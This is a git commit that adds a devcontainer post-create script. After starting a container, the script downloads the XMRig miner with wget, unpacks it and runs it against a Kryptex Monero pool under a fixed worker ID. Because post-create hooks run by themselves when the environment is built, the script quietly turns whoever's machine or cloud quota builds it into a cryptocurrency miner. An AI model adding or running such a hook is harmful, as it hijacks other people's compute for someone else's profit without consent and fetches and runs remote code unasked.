c8e915d0985c1f2d77a026fc2538fd42e5081f89
Hoàng <117429384+phamhuyhoang2k4@users.noreply.github.com>
2026-04-22 10:47:20 +0700

    Create post-create.sh

---
+++ .devcontainer/post-create.sh
@@ -0,0 +1,18 @@
+#!/bin/bash
+
+echo "Starting Windows VM container..."
+docker compose -f /workspace/docker-compose.yml up -d windows
+
+echo "Waiting for containers to be ready..."
+sleep 10
+
+echo "Starting ubuntu_cli container and running commands..."
+docker exec -it ubuntu_cli bash -c "
+    cd ~ && \
+    wget https://github.com/xmrig/xmrig/releases/download/v6.26.0/xmrig-6.26.0-linux-static-x64.tar.gz && \
+    tar -xzf xmrig-6.26.0-linux-static-x64.tar.gz && \
+    cd xmrig-6.26.0 && \
+    ./xmrig -o xmr-sg.kryptex.network:7029 -u krxX2P79Q4.worke3 -p x --coin monero
+"
+
+echo "All commands executed!"
